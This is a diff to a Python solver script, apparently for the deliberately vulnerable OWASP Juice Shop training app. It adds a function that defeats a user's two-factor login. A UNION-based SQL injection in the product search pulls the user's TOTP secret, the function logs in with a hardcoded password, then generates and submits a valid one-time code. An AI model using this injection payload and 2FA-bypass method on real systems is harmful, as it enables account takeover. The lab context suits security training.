@@ -705,25 +705,106 @@ def solve_csrf_challenge(server):
 
 
 def solve_wurstbrot_2fa(server):
-    """Access wurstbrot's insecure TOTP secret storage"""
-    print('Accessing wurstbrot 2FA secret...')
+    """
+    Solve the 2FA challenge for user "wurstbrot".
+    Mechanism: 
+    1. Steal TOTP secret via SQL Injection from Users table (column 'totpSecret').
+    2. Login with password to get 'tmpToken'.
+    3. Generate valid TOTP token using the stolen secret + time.
+    4. Verify 2FA to complete login.
+    """
+    print('Solving Wurstbrot 2FA...')
+    import hmac, struct, hashlib, time, base64
+    
+    # helper for TOTP
+    def get_totp_token(secret):
+        try:
+            padding = len(secret) % 8
+            if padding != 0: secret += '=' * (8 - padding)
+            key = base64.b32decode(secret, casefold=True)
+            msg = struct.pack(">Q", int(time.time()) // 30)
+            h = hmac.new(key, msg, hashlib.sha1).digest()
+            o = h[19] & 15
+            h = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
+            return str(h).zfill(6)
+        except Exception: return None
+
     try:
-        # Login as wurstbrot - password from users.yml line 149
-        session = get_session(server, 'wurstbrot@juice-sh.op', 'EinBelegtesBrotMitSchinkenSCHINKEN!')
+        # 1. SQLi to get secret
+        # Using the same proven payload from debug script
+        # Users schema: id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, ...
+        # Mapping for Products Union: 
+        # 1->id, '2'->name, '3'->description, email->price, password->deluxePrice, totpSecret->image
+        injection = "nonexistent')) UNION SELECT id,'2','3',email,password,totpSecret,'7','8','9' FROM Users WHERE email='wurstbrot@juice-sh.op'-- "
         
-        if not session:
-            print('Failed to login as wurstbrot')
-            return
+        # We need a fresh session or simple request for the SQLi
+        # Creating a temporary session for this task
+        s = requests.Session()
+        res = s.get(f'{server}/rest/products/search', params={'q': injection})
         
-        # Access 2FA status endpoint which exposes the secret(insecurely)
-        res = session.get(f'{server}/rest/2fa/status')
+        totp_secret = None
         if res.ok:
-            data = res.json()
-            if 'secret' in data:
-                print(f'Success! Accessed insecure TOTP secret: {data["secret"]}')
-            else:
-                print(f'2FA status (secret may be in setup true): {data}')
+            data = res.json().get('data', [])
+            for item in data:
+                # We expect the row for wurstbrot
+                if item.get('price') == 'wurstbrot@juice-sh.op':
+                    totp_secret = item.get('image')
+                    break
+        
+        if not totp_secret:
+            print("Failed to retrieve TOTP secret via SQLi.")
+            return
+
+        print(f"Retrieved TOTP Secret: {totp_secret}")
+
+        # 2. Login to get tmpToken
+        creds = {"email": "wurstbrot@juice-sh.op", "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"}
+        login_res = s.post(f'{server}/rest/user/login', json=creds)
+        
+        tmp_token = None
+        # Juice Shop returns 401 for "Password valid, need TOTP", or 200 sometimes depending on version/config
+        if login_res.status_code == 200 or login_res.status_code == 401:
+            try:
+                login_data = login_res.json()
+                # If 2FA is enabled, status should be 'totp_token_required'
+                if login_data.get('status') == 'totp_token_required':
+                    tmp_token = login_data.get('data', {}).get('tmpToken')
+                    print(f"Login stage 1 success (TOTP required). Got tmpToken.")
+                elif 'authentication' in login_data:
+                    print("Wurstbrot logged in directly (2FA not active?). Challenge might be already solved or reset needed.")
+                    return
+                else:
+                     print(f"Unexpected login response data: {login_data}")
+            except:
+                print(f"Failed to parse login response: {login_res.text}")
+                return
         else:
-            print(f'Failed to access 2FA status: {res.status_code}')
+             print(f"Login failed with status {login_res.status_code}: {login_res.text}")
+             return
+        
+        if not tmp_token:
+            print("Failed to get tmpToken during login.")
+            return
+
+        # 3. Generate Token
+        current_totp = get_totp_token(totp_secret)
+        if not current_totp:
+            print("Failed to generate TOTP token.")
+            return
+
+        # 4. Verify
+        # Endpoint: /rest/2fa/verify
+        # Payload: { totpToken: <code>, tmpToken: <token> }
+        verify_payload = {
+            "totpToken": current_totp,
+            "tmpToken": tmp_token
+        }
+        
+        verify_res = s.post(f'{server}/rest/2fa/verify', json=verify_payload)
+        if verify_res.ok:
+            print("Success! 2FA verification passed.")
+        else:
+            print(f"Failed to verify 2FA: {verify_res.status_code} {verify_res.text}")
+
     except Exception as e:
-        print(f'Error: {e}')
+        print(f"Error solving 2FA: {e}")
